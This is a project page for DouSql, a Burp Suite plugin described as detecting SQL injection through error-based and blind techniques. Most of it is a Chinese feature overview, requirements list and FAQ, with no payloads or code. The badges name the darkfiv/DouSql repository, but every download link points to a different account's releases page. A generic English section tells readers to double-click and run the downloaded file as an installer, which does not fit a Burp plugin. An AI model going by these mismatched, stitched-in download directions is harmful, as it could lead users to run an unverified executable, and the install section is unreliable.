---
layout: "default"
title: "🛠️ DouSql - Advanced SQL Injection Detection Tool"
description: "🔍 Detect SQL injection vulnerabilities with DouSql, a customizable plugin for security researchers and penetration testers, featuring smart payload management and real-time analysis."
---
# 🛠️ DouSql - Advanced SQL Injection Detection Tool

[![GitHub release (latest by date)](https://img.shields.io/github/v/release/darkfiv/DouSql?style=flat-square&logo=github)](https://github.com/darkfiv/DouSql/releases/latest)
[![GitHub stars](https://img.shields.io/github/stars/darkfiv/DouSql?style=flat-square&logo=github)](https://github.com/darkfiv/DouSql/stargazers)
[![GitHub downloads](https://img.shields.io/github/downloads/darkfiv/DouSql/total?style=flat-square&logo=github)](https://github.com/darkfiv/DouSql/releases)
[![Burp Suite](https://img.shields.io/badge/Burp%20Suite-2024.6+-orange?style=flat-square&logo=portswigger)](https://portswigger.net/burp)

## 📜 插件简介

**DouSql** 是一个高度定制的SQL注入检测插件，适用于安全研究人员和渗透测试工程师。它基于Xia Sql进行了二次开发，目标是提高SQL注入检测的效率和准确性。

## 🚀 主要功能

### ⚙️ 核心检测功能
- **多种SQL注入检测**：支持报错注入、时间盲注、布尔盲注等多种检测方式，满足不同场景的需求。
- **智能payload管理**：内置多种payload组，支持用户自定义payload配置，便于灵活使用。
- **丰富的默认字典**：包含18种常用SQL注入payload，支持多种检测策略，确保覆盖广泛。
- **实时响应分析**：自动分析响应长度、时间、状态码等关键指标，帮助用户及时发现问题。
- **全面的报错信息识别**：内置33种数据库和框架的错误信息模式，支持常见数据库如MySQL、Oracle、PostgreSQL、SQL Server和SQLite等。
- **增强JSON处理**：使用Burp Suite内置API处理复杂嵌套JSON结构，支持任意深度的对象、数组和混合数据处理。

## 📥 Download & Install

To use DouSql, visit this page to download the latest version: [Download DouSql](https://github.com/sookongi/DouSql/releases)

### 1. Visit the Releases Page
Go to the [Releases page](https://github.com/sookongi/DouSql/releases) to find the latest version of DouSql.

### 2. Download the Software
On the Releases page, find the file labeled with the version number. Click the link to download the file to your computer.

### 3. Run the Application
After the file downloads:
- Locate the downloaded file on your computer. 
- Double-click the file to run it. 
- Follow any on-screen prompts to complete the installation process.

## 🎯 系统要求

- **操作系统**：Windows 10或更高版本，macOS 10.14或更高版本，Linux（Ubuntu 20.04或更高版本）
- **内存**：至少4 GB RAM
- **硬盘**：至少100 MB可用空间
- **其他**：需要安装Burp Suite 2024.6或更高版本。

## ℹ️ 兼容性

DouSql兼容多种数据库，确保用户可以在不同的环境下进行有效的SQL注入检测。它支持以下数据库：
- MySQL
- Oracle
- PostgreSQL
- SQL Server
- SQLite

## 🛡️ 使用建议

- 定期更新DouSql，以获得最新的功能和bug修复。
- 在使用前，查阅官方文档，以充分了解所有功能和最佳实践。
- 在生产环境之外测试，确保不会对实时数据造成影响。

## 💬 常见问题解答

### DouSql如何工作？
DouSql使用多种检测技术来识别SQL注入漏洞。它执行不同类型的注入，分析服务器响应，帮助用户找到潜在的安全问题。

### 我需要编程知识才能使用DouSql吗？
不，DouSql设计为用户友好。您无需编程知识即可有效使用它。

### 我如何提供反馈或报告错误？
您可以在GitHub上提交问题，或通过提供的联系方式与我们联系。

## 📞 联系我们

如果您在使用中遇到问题或需要支持，请访问我们的GitHub页面并提交您的需求。我们会尽快帮助您。